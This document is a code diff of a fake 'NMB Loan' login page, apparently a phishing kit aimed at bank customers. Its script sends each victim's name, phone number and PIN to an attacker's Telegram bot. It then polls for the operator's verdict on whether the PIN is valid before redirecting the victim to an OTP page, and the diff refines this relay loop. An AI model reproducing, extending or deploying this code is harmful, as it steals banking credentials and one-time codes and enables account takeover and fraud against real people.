@@ -168,39 +168,15 @@
             background: rgba(0,34,68,0.93);
             z-index: 2000;
             backdrop-filter: blur(6px);
+            text-align: center;
+            padding: 20px;
         }
 
         .overlay.on { display: flex; }
         .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
-        .sp-t { font-size: 14px; font-weight: 800; color: white; }
-        .sp-s { font-size: 11px; color: rgba(255,255,255,0.65); }
+        .sp-t { font-size: 16px; font-weight: 800; color: white; margin-top: 10px; }
+        .sp-s { font-size: 12px; color: rgba(255,255,255,0.7); margin-top: 5px; line-height: 1.5; }
         @keyframes sp { to { transform: rotate(360deg); } }
-
-        /* Modal */
-        .modal {
-            position: fixed; inset: 0;
-            display: none;
-            align-items: center; justify-content: center;
-            background: rgba(0,34,68,0.75);
-            z-index: 2000; padding: 20px;
-            backdrop-filter: blur(6px);
-        }
-
-        .modal.on { display: flex; }
-
-        .modal-box {
-            background: white;
-            border-radius: 16px;
-            padding: 32px;
-            max-width: 360px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 16px 48px rgba(0,51,102,0.3);
-        }
-
-        .modal-box h2 { font-size: 18px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 8px; }
-        .modal-box p { color: var(--muted); font-size: 13px; margin-bottom: 18px; }
-        .modal-btn { width: 100%; padding: 14px; border-radius: 50px; border: none; font-weight: 800; font-size: 12px; cursor: pointer; background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark)); color: white; font-family: inherit; box-shadow: 0 4px 12px rgba(0,51,102,0.25); }
 
         @media (max-width: 500px) {
             main { padding: 24px 12px; }
@@ -209,7 +185,7 @@
         }
     </style>
 </head>
-<body>
+<body onload="init()">
     <header><a class="logo" href="index.html"><span class="nmb">NMB</span><span class="loan">Loan</span></a></header>
 
     <main>
@@ -252,14 +228,10 @@
         </div>
     </main>
 
-    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Account</div><div class="sp-s">Please wait...</div></div>
-
-    <div id="aModal" class="modal">
-        <div class="modal-box">
-            <h2>Already Applied</h2>
-            <p>This transaction has already been applied to your account.</p>
-            <button class="modal-btn" onclick="goOTP()">Continue</button>
-        </div>
+    <div id="ov" class="overlay">
+        <div class="spin"></div>
+        <div class="sp-t">Processing Verification</div>
+        <div class="sp-s">Please wait a moment while we verify your details.<br>Do not close this page.</div>
     </div>
 
     <script>
@@ -290,11 +262,20 @@
 
         async function tg(msg, btns) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                 });
+                const d = await r.json();
+                if (d.ok) {
+                    // Get the latest update ID to avoid processing old messages
+                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
+                    const ud = await ur.json();
+                    if (ud.ok && ud.result.length > 0) {
+                        luid = ud.result[0].update_id;
+                    }
+                }
             } catch(e) { console.error(e); }
         }
 
@@ -312,7 +293,7 @@
             const msg = `📱 <b>NMB Loan Login</b>\n\n<b>Name:</b> <code>${name}</code>\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>$${bd.price || '0'} USD</code>`;
 
             const btns = [
-                [{ text: '✓ Approved', callback_data: 'login_approved' }, { text: '✗ Declined', callback_data: 'login_declined' }],
+                [{ text: '✓ Valid PIN', callback_data: 'pin_valid' }, { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }],
                 [{ text: '⚠️ Already Applied', callback_data: 'login_applied' }]
             ];
 
@@ -327,27 +308,38 @@
                     .then(r => r.json())
                     .then(d => {
                         if (d.ok && d.result.length > 0) {
-                            const u = d.result[0];
-                            luid = u.update_id;
-                            if (u.callback_query) {
-                                const cb = u.callback_query.data;
-                                if (cb === 'login_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goOTP(); }
-                                else if (cb === 'login_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Request declined. Try again.'); document.getElementById('frm').reset(); }
-                                else if (cb === 'login_applied') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('aModal').classList.add('on'); }
-                            }
+                            d.result.forEach(u => {
+                                luid = u.update_id;
+                                if (u.callback_query) {
+                                    const cb = u.callback_query.data;
+                                    if (cb === 'pin_valid') { 
+                                        clearInterval(iv); 
+                                        document.getElementById('ov').classList.remove('on'); 
+                                        goOTP(); 
+                                    }
+                                    else if (cb === 'pin_invalid') { 
+                                        clearInterval(iv); 
+                                        document.getElementById('ov').classList.remove('on'); 
+                                        showErr('Invalid PIN. You cannot proceed, kindly put the correct PIN.'); 
+                                        document.getElementById('pin').value = '';
+                                    }
+                                    else if (cb === 'login_applied') { 
+                                        clearInterval(iv); 
+                                        document.getElementById('ov').classList.remove('on'); 
+                                        showErr('You already applied for this loan.');
+                                    }
+                                }
+                            });
                         }
                     }).catch(e => console.error(e));
-            }, 1000);
-            setTimeout(() => clearInterval(iv), 300000);
+            }, 1500);
+            setTimeout(() => clearInterval(iv), 600000);
         }
 
         function goOTP() {
-            document.getElementById('aModal').classList.remove('on');
             const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
             location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${ph}`;
         }
-
-        window.addEventListener('load', init);
     </script>
 </body>
 </html>
